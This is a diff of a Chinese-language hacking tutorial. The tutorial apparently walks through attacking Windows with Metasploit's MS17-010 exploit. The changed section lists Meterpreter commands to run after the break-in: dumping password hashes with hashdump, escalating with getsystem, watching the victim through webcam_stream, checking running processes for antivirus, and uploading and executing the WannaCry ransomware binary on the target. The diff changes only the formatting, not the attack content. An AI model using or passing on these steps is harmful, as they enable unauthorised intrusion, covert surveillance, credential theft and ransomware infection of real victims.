@@ -36,21 +36,23 @@ exploit                                          /*发起攻击,也可以用`run
 出现win -success!就成功了。
 
 ## 可以试试以下操作，或者help
-`getuid，sysinfo` /查看系统信息 \
-`webcam_list` /看看被控制的电脑有没有摄像头,如果有用`webcam_stream`命令可以打开摄像头监控 \
-`route` /查看路由表 \
-`screenshot` /桌面截图，很卡 \
-`shell` /打开命令行，然后可以ipconfig/whoami/net user \
-`ps` /看看开了哪些杀毒软件，内网一致 \
-`kill` \
-`hashdump` \
-`getsystem` \
-提权 \
-`upload wcry/wcry.ext c:\` \
-`upload wcry/FILE_ID.DIZ c:\` \
-`execute -f c:\wcry.exe` \
-上传和执行勒索病毒
+<pre>
+getuid，sysinfo                     /*查看系统信息*/
+webcam_list                  /*看看被控制的电脑有没有摄像头,如果有用`webcam_stream`命令可以打开摄像头监控*/
+route                            /*查看路由表 */
+screenshot                        /*桌面截图，很卡* /
+shell                        /*打开命令行，然后可以ipconfig/whoami/net user*/
+ps                               /*看看开了哪些杀毒软件，内网一致*/
+kill
+hashdump
+getsystem
 
+提权
+upload wcry/wcry.ext c:\
+upload wcry/FILE_ID.DIZ c:\
+execute -f c:\wcry.exe
+上传和执行勒索病毒
+</pre>
 ## 使用msf框架攻击win32
 <pre>
 use exploit/windows/smb/ms17_010_psexec
